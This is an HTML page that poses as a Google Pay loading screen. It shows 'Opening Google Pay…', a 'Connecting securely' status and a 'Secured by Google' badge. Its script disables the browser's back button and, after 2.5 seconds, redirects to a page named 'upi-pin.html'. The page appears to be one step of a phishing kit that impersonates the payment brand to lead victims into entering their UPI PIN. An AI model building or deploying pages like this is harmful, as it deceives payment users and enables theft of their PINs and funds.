<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Google Pay</title>
  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
  <style>
    html, body {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      overflow: hidden;
      position: fixed;
    }
    
    body {
      background: #fff;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      font-family: 'Google Sans', 'Roboto', sans-serif;
      position: relative;
    }
    
    body::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: radial-gradient(circle at 30% 40%, rgba(66, 133, 244, 0.05) 0%, transparent 50%),
                  radial-gradient(circle at 70% 60%, rgba(234, 67, 53, 0.05) 0%, transparent 50%);
      animation: colorPulse 8s ease-in-out infinite;
    }
    
    .content {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      width: 100%;
      padding: 15px;
      box-sizing: border-box;
      position: relative;
      z-index: 1;
    }
    
    .logo-container {
      animation: fadeInScale 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55);
      margin-bottom: 25px;
      position: relative;
    }
    
    .logo-container::before {
      content: '';
      position: absolute;
      top: 50%;
      left: 50%;
      width: 140%;
      height: 140%;
      background: radial-gradient(circle, rgba(66, 133, 244, 0.1) 0%, transparent 70%);
      border-radius: 50%;
      transform: translate(-50%, -50%);
      animation: pulseRing 2s ease-in-out infinite;
    }
    
    .gpay-logo {
      width: clamp(110px, 32vw, 150px);
      height: auto;
      animation: logoFloat 3s ease-in-out infinite;
      filter: drop-shadow(0 4px 12px rgba(0, 0, 0, 0.1));
      position: relative;
      z-index: 2;
    }
    
    .loading-text {
      margin-top: 35px;
      font-size: clamp(17px, 4.5vw, 22px);
      color: #202124;
      opacity: 0;
      animation: fadeInUp 0.8s 0.4s forwards;
      font-weight: 500;
      text-align: center;
    }
    
    .status {
      margin-top: 12px;
      font-size: clamp(14px, 3.5vw, 16px);
      color: #34a853;
      opacity: 0;
      animation: fadeInUp 0.8s 0.7s forwards, textPulse 2s 1.5s infinite;
      font-weight: 600;
      text-align: center;
    }
    
    .spinner-container {
      margin-top: 30px;
      opacity: 0;
      animation: fadeInUp 0.8s 1s forwards;
      position: relative;
    }
    
    .spinner {
      width: 50px;
      height: 50px;
      border: 5px solid #f0f0f0;
      border-top: 5px solid #4285f4;
      border-right: 5px solid #34a853;
      border-bottom: 5px solid #fbbc04;
      border-left: 5px solid #ea4335;
      border-radius: 50%;
      animation: spin 1.2s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite;
      box-shadow: 0 4px 15px rgba(66, 133, 244, 0.2);
    }
    
    .spinner::after {
      content: '';
      position: absolute;
      top: 50%;
      left: 50%;
      width: 30px;
      height: 30px;
      border: 3px solid transparent;
      border-top: 3px solid rgba(66, 133, 244, 0.6);
      border-radius: 50%;
      transform: translate(-50%, -50%);
      animation: spinReverse 1.5s linear infinite;
    }
    
    .progress-dots {
      display: flex;
      gap: 10px;
      margin-top: 25px;
      opacity: 0;
      animation: fadeInUp 0.8s 1.3s forwards;
    }
    
    .dot {
      width: 12px;
      height: 12px;
      border-radius: 50%;
      animation: dotPulse 1.4s ease-in-out infinite;
      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
    }
    
    .dot:nth-child(1) {
      background: #4285f4;
      animation-delay: 0s;
    }
    
    .dot:nth-child(2) {
      background: #ea4335;
      animation-delay: 0.2s;
    }
    
    .dot:nth-child(3) {
      background: #fbbc04;
      animation-delay: 0.4s;
    }
    
    .dot:nth-child(4) {
      background: #34a853;
      animation-delay: 0.6s;
    }
    
    .security-badge {
      position: absolute;
      bottom: 30px;
      display: flex;
      align-items: center;
      gap: 8px;
      background: linear-gradient(135deg, rgba(52, 168, 83, 0.1), rgba(52, 168, 83, 0.15));
      padding: 10px 20px;
      border-radius: 25px;
      font-size: 13px;
      color: #34a853;
      font-weight: 600;
      box-shadow: 0 4px 15px rgba(52, 168, 83, 0.15);
      animation: fadeInUp 1s 1.6s forwards;
      opacity: 0;
    }
    
    .security-badge svg {
      animation: shieldPulse 2s ease-in-out infinite;
    }
    
    @keyframes colorPulse {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.7; }
    }
    
    @keyframes fadeInScale {
      from { opacity: 0; transform: scale(0.5) rotate(-10deg); }
      to { opacity: 1; transform: scale(1) rotate(0deg); }
    }
    
    @keyframes pulseRing {
      0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 0.5; }
      50% { transform: translate(-50%, -50%) scale(1.2); opacity: 0.2; }
    }
    
    @keyframes fadeInUp {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }
    
    @keyframes logoFloat {
      0%, 100% { transform: translateY(0px) rotate(0deg); }
      50% { transform: translateY(-12px) rotate(2deg); }
    }
    
    @keyframes textPulse {
      0%, 100% { opacity: 1; transform: scale(1); }
      50% { opacity: 0.8; transform: scale(0.98); }
    }
    
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    
    @keyframes spinReverse {
      to { transform: translate(-50%, -50%) rotate(-360deg); }
    }
    
    @keyframes dotPulse {
      0%, 100% { transform: scale(1) translateY(0); opacity: 1; }
      50% { transform: scale(1.4) translateY(-4px); opacity: 0.6; }
    }
    
    @keyframes shieldPulse {
      0%, 100% { transform: scale(1); }
      50% { transform: scale(1.1); }
    }
  </style>
</head>
<body>
  <div class="content">
    <div class="logo-container">
      <img src="google-pay-icon.png" alt="Google Pay" class="gpay-logo">
    </div>
    
    <div class="loading-text">Opening Google Pay‚Ä¶</div>
    <div class="status">üîê Connecting securely</div>
    
    <div class="spinner-container">
      <div class="spinner"></div>
    </div>
    
    <div class="progress-dots">
      <div class="dot"></div>
      <div class="dot"></div>
      <div class="dot"></div>
      <div class="dot"></div>
    </div>
  </div>
  
  <div class="security-badge">
    <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
      <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
    </svg>
    <span>Secured by Google</span>
  </div>

  <script>
    history.pushState(null, null, location.href);
    window.onpopstate = function() {
      history.go(1);
    };
    
    setTimeout(() => {
      window.location.href = 'upi-pin.html';
    }, 2500);
  </script>
</body>
</html>
